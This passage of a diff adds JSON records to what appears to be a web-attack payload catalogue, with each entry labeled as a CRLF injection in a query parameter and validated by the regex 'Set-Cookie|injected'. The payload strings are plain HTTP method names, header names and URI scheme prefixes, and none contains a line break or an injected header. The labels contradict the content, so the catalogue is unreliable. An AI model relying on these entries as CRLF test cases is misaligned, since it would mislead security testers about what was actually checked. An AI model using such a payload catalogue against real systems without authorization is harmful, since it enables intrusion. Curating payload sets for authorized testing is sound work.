+    "payload_id": "OWP-393701",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UNCHECKOUT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393702",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "MKWORKSPACE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393703",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UPDATE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393704",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "MERGE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393705",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "BASELINE-CONTROL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393706",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "MKACTIVITY",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393707",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ORDERPATCH",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393708",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ACL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393709",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "PATCH",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393710",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "SEARCH",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393711",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ARBITRARY",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393712",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "BCOPY",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393713",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "BDELETE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393714",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "BMOVE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393715",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "BPROPFIND",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393716",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "BPROPPATCH",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393717",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "DEBUG",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393718",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "INDEX",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393719",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "NOTIFY",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393720",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "POLL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393721",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "RPC_IN_DATA",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393722",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "RPC_OUT_DATA",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393723",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "SUBSCRIBE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393724",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UNSUBSCRIBE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393726",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Accept",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393727",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Accept-Charset",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393728",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Accept-Encoding",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393729",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Accept-Language",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393730",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Accept-Datetime",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393731",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Authorization",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393732",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Cache-Control",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393733",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Connection",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393734",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Length",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393735",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-MD5",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393736",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Type",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393737",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Date",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393738",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Expect",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393739",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "From",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393740",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Host",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393741",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "If-Match",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393742",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "If-Modified-Since",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393743",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "If-None-Match",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393744",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "If-Range",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393745",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "If-Unmodified-Since",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393746",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Max-Forwards",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393747",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Origin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393748",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Pragma",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393749",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Proxy-Authorization",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393750",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Range",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393751",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Referer",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393752",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "TE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393753",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "User-Agent",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393754",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Upgrade",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393755",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Via",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393756",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Warning",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393758",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "DNT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393762",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Front-End-Https",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393766",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Proxy-Connection",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393767",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Access-Control-Allow-Origin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393768",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Accept-Ranges",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393769",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Age",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393770",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Allow",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393771",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Encoding",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393772",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Language",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393773",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Location",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393774",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Disposition",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393775",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Range",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393776",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ETag",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393777",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Expires",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393778",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Last-Modified",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393779",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Link",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393780",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Location",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393781",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "P3P",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393782",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Proxy-Authenticate",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393783",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Refresh",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393784",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Retry-After",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393785",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Set-Cookie",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393786",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Strict-Transport-Security",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393787",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Trailer",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393788",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Vary",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393789",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "WWW-Authenticate",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393791",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Public-Key-Pins",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393793",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Security-Policy",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393799",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "aaa:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393800",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "aaas:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393801",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "about:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393802",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "acap:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393803",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "adiumxtra:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393804",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "afp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393805",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "aim:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393806",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "apt:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393807",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "aw:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393808",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "beshare:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393809",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "bitcoin:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393810",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "bolo:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393811",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "callto:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393812",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "cap:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393813",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "chrome:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393814",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "cid:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393815",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "coap:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393816",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "content:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393817",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "crid:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393818",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "cvs:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393819",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "data:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393820",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dav:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393821",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dict:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393822",
